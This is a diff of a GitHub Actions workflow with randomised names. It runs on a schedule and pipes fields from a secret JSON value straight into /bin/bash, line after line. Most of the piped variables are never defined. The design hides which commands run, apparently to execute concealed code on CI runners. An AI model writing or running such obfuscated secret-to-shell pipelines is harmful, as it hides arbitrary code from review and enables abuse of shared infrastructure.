@@ -2,23 +2,28 @@ name: piernuosi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
+    - cron: '49 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: piernuosi
         env:
-          j7901: ${{ secrets.j7901 }}
+          sxcp5: ${{ secrets.sxcp5 }}
         run: |
-          echo $j7901 | jq -r .ns9135 | /bin/bash
-          echo $sz8 | jq -r .uglu92983 | /bin/bash
-          echo $cy25433 | jq -r .u2071 | /bin/bash
-          echo $ii5438 | jq -r .ml47989 | /bin/bash
-          echo $b4694 | jq -r .bc0412 | /bin/bash
-          echo $sx358 | jq -r .q20 | /bin/bash
-          echo $tc6 | jq -r .ukqu0 | /bin/bash
-          echo $c9459 | jq -r .pfegh8 | /bin/bash
+          echo $sxcp5 | jq -r .k81 | /bin/bash
+          echo $yndn653 | jq -r .f405 | /bin/bash
+          echo $ti8825 | jq -r .gop7657 | /bin/bash
+          echo $shgc6 | jq -r .yfc316 | /bin/bash
+          echo $riig2697 | jq -r .hp85893 | /bin/bash
+          echo $dxa03805 | jq -r .pnp8 | /bin/bash
+          echo $cruwn71796 | jq -r .k88769 | /bin/bash
+          echo $qvx8 | jq -r .xyriq12496 | /bin/bash
+          echo $g95 | jq -r .llfq132 | /bin/bash
+          echo $akued0 | jq -r .x72992 | /bin/bash
+          echo $ekh8 | jq -r .nv846 | /bin/bash
+          echo $dxtc5057 | jq -r .yuyjk622 | /bin/bash
 
